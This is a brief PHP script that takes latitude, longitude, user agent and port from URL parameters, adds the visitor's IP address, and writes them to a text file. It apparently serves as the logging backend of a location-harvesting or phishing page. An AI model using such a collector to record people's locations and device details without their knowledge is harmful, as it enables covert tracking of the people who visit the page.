<?php

$myfile = fopen("information.txt", "w");
$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nUser-Agent: " . $_GET["uagent"] . "\nPort: " . $_GET["port"];
fwrite($myfile, $txt);
fclose($myfile);

?>